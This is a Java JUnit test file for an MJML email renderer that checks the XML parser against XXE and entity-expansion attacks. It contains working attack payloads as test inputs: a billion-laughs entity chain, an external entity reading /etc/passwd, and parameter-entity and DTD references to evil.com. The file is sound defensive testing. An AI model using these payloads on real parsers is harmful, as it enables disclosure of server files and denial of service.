package dev.jcputney.mjml.parser;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import dev.jcputney.mjml.MjmlException;
import dev.jcputney.mjml.MjmlRenderer;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import org.junit.jupiter.api.Test;

/**
 * Tests verifying parser security protections against XXE and entity expansion attacks.
 *
 * <p>The MJML pipeline has two layers of defense:
 * <ol>
 *   <li>The preprocessor wraps "ending tag" content (mj-text, mj-button, etc.) in CDATA sections,
 *       which neutralizes any entity references within that content.</li>
 *   <li>The XML parser has FEATURE_SECURE_PROCESSING enabled and external entities disabled,
 *       which blocks entity expansion in non-CDATA contexts (attributes, structure).</li>
 * </ol>
 */
class ParserSecurityTest {

  // -- Parser factory has secure processing features enabled --

  @Test
  void factoryHasSecureProcessingEnabled() throws Exception {
    // Verify that the factory features are correctly set by testing
    // the same configuration used in MjmlParser
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

    assertTrue(factory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING),
        "FEATURE_SECURE_PROCESSING should be enabled");
    assertFalse(factory.getFeature("http://xml.org/sax/features/external-general-entities"),
        "External general entities should be disabled");
    assertFalse(factory.getFeature("http://xml.org/sax/features/external-parameter-entities"),
        "External parameter entities should be disabled");
  }

  // -- CDATA wrapping neutralizes entity expansion in ending tags --

  @Test
  void entityReferencesInMjTextAreNeutralizedByCdata() {
    // DTD-defined entities inside <mj-text> content get CDATA-wrapped by the preprocessor.
    // The entity reference becomes literal text, not an expansion.
    String mjml = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml [
          <!ENTITY payload "EXPANDED_PAYLOAD">
        ]>
        <mjml>
          <mj-body>
            <mj-section>
              <mj-column>
                <mj-text>&payload;</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    // The preprocessor wraps <mj-text> content in CDATA, so &payload; becomes literal text.
    // This should either render safely (with literal &payload;) or throw an exception.
    // Either way, the entity should NOT be expanded.
    try {
      String html = MjmlRenderer.render(mjml).html();
      assertFalse(html.contains("EXPANDED_PAYLOAD"),
          "Entity should NOT be expanded — CDATA wrapping should neutralize it");
    } catch (MjmlException e) {
      // Also acceptable: parser rejects the document entirely
      assertNotNull(e.getMessage());
    }
  }

  @Test
  void billionLaughsInMjTextNeutralizedByCdata() {
    // Even with billion laughs DTD, the entity ref inside mj-text is CDATA-wrapped
    String mjml = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <mjml>
          <mj-body>
            <mj-section>
              <mj-column>
                <mj-text>&lol4;</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    try {
      String html = MjmlRenderer.render(mjml).html();
      // If it renders, the entity should not have been expanded (CDATA neutralized it)
      // Count occurrences of "lol" — should be minimal (just the literal text)
      long lolCount = html.chars().filter(c -> c == 'l').count();
      // A fully-expanded lol4 would have 10000 "lol" strings (30000 chars).
      // The CDATA wrapping prevents this explosion.
      assertTrue(lolCount < 500,
          "Entity expansion should be prevented by CDATA wrapping");
    } catch (MjmlException e) {
      // Also acceptable: parser rejects the document
      assertNotNull(e.getMessage());
    }
  }

  // -- Entities in non-ending-tag contexts (attributes) --

  @Test
  void entityExpansionInAttributeValueIsHandled() {
    // Entities referenced in attribute values (not CDATA-wrapped by preprocessor)
    // are handled by the XML parser with FEATURE_SECURE_PROCESSING
    String mjml = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml [
          <!ENTITY injected "INJECTED_VALUE">
        ]>
        <mjml>
          <mj-body background-color="&injected;">
            <mj-section>
              <mj-column>
                <mj-text>Test</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    // Internal entity expansion in attributes may be allowed by FEATURE_SECURE_PROCESSING
    // (it limits the total entity expansion count, not individual entities).
    // The important thing is that it doesn't crash and external entities are blocked.
    try {
      String html = MjmlRenderer.render(mjml).html();
      assertNotNull(html);
      // Even if the entity was expanded, it's just a string value — no security issue
    } catch (MjmlException e) {
      // Also acceptable
      assertNotNull(e.getMessage());
    }
  }

  // -- External entity references are blocked --

  @Test
  void externalEntityInAttributeContextIsBlocked() {
    // Place external entity reference where the preprocessor won't CDATA-wrap it
    // Use a direct entity reference inside the XML structure
    String xxe = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <mjml>
          <mj-body>
            <mj-section background-color="&xxe;">
              <mj-column>
                <mj-text>Test</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    // With external-general-entities disabled, &xxe; should not resolve
    try {
      String html = MjmlRenderer.render(xxe).html();
      // If it renders, verify the external content was NOT included
      assertFalse(html.contains("root:"),
          "External entity content (/etc/passwd) should NOT appear in output");
    } catch (MjmlException e) {
      // Parser rejection is also acceptable
      assertNotNull(e.getMessage());
    }
  }

  @Test
  void parameterEntityExternalIsRejected() {
    // Parameter entity variant of XXE — should be blocked by
    // external-parameter-entities being disabled
    String paramEntity = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml [
          <!ENTITY % ext SYSTEM "http://evil.com/xxe.dtd">
          %ext;
        ]>
        <mjml>
          <mj-body>
            <mj-section>
              <mj-column>
                <mj-text>Test</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    // Parameter entity expansion in DTD is blocked
    // This might throw during preprocessing (% entity is not valid in content)
    // or during XML parsing (external parameter entities disabled).
    try {
      String html = MjmlRenderer.render(paramEntity).html();
      // If it somehow renders, external content should not be present
      assertNotNull(html);
    } catch (MjmlException e) {
      // Expected: parser rejects the external parameter entity
      assertNotNull(e.getMessage());
    } catch (Exception e) {
      // Any other exception is also acceptable (the attack was blocked)
      assertNotNull(e.getMessage());
    }
  }

  // -- Verify external DTD loading is disabled --

  @Test
  void externalDtdNotLoaded() {
    // Reference an external DTD that doesn't exist — should not cause a network request
    String mjml = """
        <?xml version="1.0"?>
        <!DOCTYPE mjml SYSTEM "http://evil.com/malicious.dtd">
        <mjml>
          <mj-body>
            <mj-section>
              <mj-column>
                <mj-text>Content</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    // With load-external-dtd=false, this should either work (DTD ignored)
    // or throw a parse exception. It should NOT hang trying to fetch the DTD.
    try {
      String html = MjmlRenderer.render(mjml).html();
      assertNotNull(html);
      assertTrue(html.contains("Content"),
          "Document should render when external DTD is referenced but not loaded");
    } catch (MjmlException e) {
      // Also acceptable
      assertNotNull(e.getMessage());
    }
  }

  // -- Ensure normal MJML still works --

  @Test
  void normalMjmlWithoutDtdStillWorks() {
    String normalMjml = """
        <mjml>
          <mj-body>
            <mj-section>
              <mj-column>
                <mj-text>Normal content</mj-text>
              </mj-column>
            </mj-section>
          </mj-body>
        </mjml>
        """;

    String html = assertDoesNotThrow(() -> MjmlRenderer.render(normalMjml).html());
    assertNotNull(html);
    assertTrue(html.contains("Normal content"));
  }
}
